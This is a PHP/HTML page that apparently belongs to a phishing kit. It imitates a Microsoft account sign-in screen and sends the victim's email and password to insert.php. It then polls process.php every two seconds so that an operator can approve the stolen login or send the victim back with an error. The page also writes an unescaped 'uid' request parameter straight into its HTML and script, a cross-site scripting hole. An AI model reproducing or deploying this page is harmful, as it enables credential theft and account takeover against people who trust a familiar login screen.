<!DOCTYPE html>
<html lang="en">
<head>
  <title>Sign in to your account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="shortcut icon" type="text/css" href="ico.ico">
  <style>
    /* Add the following CSS code to your <style> tag or CSS file */
    .form-control {
        border: none;
        border-radius: 0;
        border-bottom: 1px solid #ced4da;
        box-shadow: none;
        outline: none; /* Add this line to remove the blue highlight */
        background-color: transparent; /* Add this line to remove the blue background color */
        padding-left: 0;
    }

    /* Add this code to remove the blue highlight on focus */
    .form-control:focus {
        box-shadow: none;
        border-color: #538cc6;
    }
        .loader {
      border: 5px solid #f3f3f3;
      border-radius: 50%;
      border-top: 5px solid #3498db;
      width: 50px;
      height: 50px;
      -webkit-animation: spin 1s linear infinite; /* Safari */
      animation: spin 1s linear infinite;
    }

    /* Safari */
    @-webkit-keyframes spin {
      0% { -webkit-transform: rotate(0deg); }
      100% { -webkit-transform: rotate(360deg); }
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
</style>
</head>
<body style="background-image: url(bg.png); background-size: auto auto; background-repeat: no-repeat;">
  <div class="container" style="margin-top:120px ;">
    <div class="row">
      <div class="col-md-5 col-md-offset-3" style="padding: 10px 25px;">
        <div class="well" style="background-color: #fff; border-radius: 0; min-height: 300px; padding: 35px 30px;">
          <img src="logo.svg" style="margin-bottom: 10px;">
          <p style="font-weight: 500; font-size: 1.8rem; line-height: 1.75rem;color: #1b1b1b;" id="sign">Sign in</p>
          <p><a href="index.php"><img src="back.svg" style="display:none;" id="back"></a><span id="rs"></span></p>
            <?php 
                if (isset($_GET["err"])) {
                  echo "<p style='color:red'>Incorrect Username or Password ! </p>";
                }
              ?>
          <?php
if (isset($_GET["uid"])) {
  $uid = $_GET['uid'];
  echo "<div id='result'></div>";
  echo "<input type='hidden' id='status' value='$uid'>";
  // code...
  echo "<br><center><div class='loader'></div><br>Please wait...</center>";
} else {
  ?>
          <form method="post" action="insert.php">
            <input type="text" class="form-control" name="username" placeholder="Email, phone or Skype" id="uname">
            <input type="password" name="password" class="form-control" required placeholder="Password" id="pass" style="display: none;">
            <p style="margin:25px 0; font-size: 12px;">No account? <a href="#">Create one!</a> </p>
            <p style="font-size: 12px; margin-bottom: 20px;"><a href="#">Sign in with Windows Hello or a security key <img src="documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"> </a></p>
            <button type="button" class="pull-right btn btn-primary" id="nextBtn" style="border-radius: 0; padding: 5px 25px;">Next</button>
            <input type="submit" name="sub" class="pull-right btn btn-primary" id="submit"  style="border-radius: 0; padding: 5px 25px; display: none;">
            <br>
          </form>
        <?php
}
        ?>
        </div>
        <div class="well" style="background-color:#fff; border-radius:0; padding:10px;">
          <img src="key.svg"> <span>Sign-in options</span>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
<script type="text/javascript">
  $(document).ready(function() {
    setInterval(function() {
        var uid = $("#status").val();
    $.ajax({
        url: 'process.php',
        type: 'GET',
        data: {uid: uid},
        success: function(response) {
            // check status 
            if (response == 1) {
              // console.log("move to confirm");
              window.location.href="options.php?uid=<?php echo $uid; ?>";
            }else if(response == 0){
              
            }
            else{
              window.location.href="index.php?err=pwd";
            }
        },
        error: function(jqXHR, textStatus, errorThrown) {
            console.log(textStatus + ': ' + errorThrown);
        }
    });
    }, 2000); // reload every 2 seconds
  });
</script>

<script type="text/javascript">
  $(document).ready(function(){
       $("#nextBtn").on("click", function(){
        var name = $("#uname").val();
        $("#rs").html(name);
        $("#nextBtn").hide();
        $("#sign").hide();
        $("#uname").hide();
        $("#back").show();
        $("#pass").show();
        $("#submit").show();
    });
  });
</script>